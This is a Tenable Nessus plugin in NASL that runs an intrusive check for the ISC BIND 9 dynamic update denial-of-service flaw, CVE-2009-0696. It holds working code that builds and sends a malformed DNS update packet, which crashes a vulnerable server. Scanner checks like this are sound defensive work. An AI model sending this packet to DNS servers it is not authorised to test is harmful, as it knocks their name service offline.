#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(40450);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/05/04 14:30:40 $");

  script_cve_id("CVE-2009-0696");
  script_bugtraq_id(35848);
  script_osvdb_id(56584);

  script_name(english:"ISC BIND 9 Dynamic Update Handling Remote DoS (intrusive check)");
  script_summary(english:"Kill BIND9 with a malicious update");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote name server may be affected by a denial of service
vulnerability." );
  script_set_attribute(attribute:"description", value:
"It is possible to kill the remote DNS server by sending it a
specially crafted dynamic update message to a zone for which the
server is a master. 

Note that this plugin requires knowledge of the target host's FQDN.");

  script_set_attribute(attribute:"solution", value:
"Upgrade to BIND 9.4.3-P3 / 9.5.1-P3 / 9.6.1-P3 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_cwe_id(16);
  script_set_attribute(attribute:"vuln_publication_date", value: "2009/07/28");
  script_set_attribute(attribute:"patch_publication_date", value: "2009/07/28");
  script_set_attribute(attribute:"plugin_publication_date", value: "2009/07/31");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:isc:bind");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");
  script_family(english: "DNS");

  script_dependencies("dns_dyn_update.nasl");
  script_require_keys("DNS/udp/53");
  exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("dns_func.inc");
include("byte_func.inc");

function dns_update_ANY(zone, name, delete)
{
  local_var	pkt, ptr1;

  pkt = raw_string(
      rand() % 256, rand() % 256,	# Transaction ID
      0x28, 0x00,			# Flags: opcode = 5 (dynamic update)
      0, 1,				# zones: 1
      0, 1,				# Prerequesites: 1
      0, 1,				# updates: 1
      0, 0);				# additional RRs: 0
  pkt += dns_str_to_query_txt(zone);
  pkt += raw_string(
      0, 6,		# SOA
      0, 1);		# IN

  #prerequisite
  ptr1 = strlen(pkt); 
  pkt += raw_string(strlen(name) % 255) + name;	# No null byte after that!
  pkt += raw_string(
      0xC0, 0x0C,
      0, 0xFF,		# ANY
      0, 1,		# IN
      0, 0, 0, 0,	# TTLS
      0, 0 );		# Dtaa length
      

  ##pkt += raw_string(strlen(name) % 255) + name;	# No null byte after that!
  pkt += raw_string(
      0xC0, ptr1 % 255,	# compressed name
      0, 0xFF,		# A
      0, 0xFF,
      0, 0, 0, 0,
      0, 0);		# Data length
  return pkt;
}

function test(soc, zone)
{
  local_var	dns, packet, r;

 # Check
 dns["transaction_id"] = rand() % 65535;
 dns["flags"]	   = 0x0010;
 dns["q"]		   = 1;
 packet = mkdns(dns: dns, 
  query: mk_query( txt: dns_str_to_query_txt("nessus"+rand()+ "." + zone), 
  	     	       type: 0x000c, class: 0x0001) );
 send(socket:soc, data:packet);
 r = recv(socket:soc, length:1024);
 return r;
}

# if (! get_kb_item("DNS/udp/53")) exit(0);

port = 53;
if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");

soc = open_sock_udp(53);
if (! soc) exit(0);

names_l = make_list();
i = 0;
name1 = get_host_name();
if (name1 !~ "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(\.in-addr\.arpa\.?)?$")
 names_l[i++] = name1;
name2 = get_kb_item("bind/hostname");
if (name2 && name2 != name1 && name2 !~ "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(\.in-addr\.arpa\.?)?$")
 names_l[i++] = name2;

dynzone = get_kb_item("DNS/dyn_update_zone");
zone = dynzone;

if (! test(soc: soc, zone: zone)) exit(0);

foreach name (names_l)
{
 p = strstr(name, ".");
 if (p) name = name - p;
 if (!dynzone)
  if (isnull(p)) continue;
  else zone = substr(p, 1);

 pkt = dns_update_ANY(zone: zone, name: name);
 send(socket:soc, data: pkt);
 r = recv(socket:soc, length:1024);
 if (! r) break;
}

if (! r && ! test(soc: soc, zone: zone))
  security_warning(port: 53, proto: "udp");
close(soc);
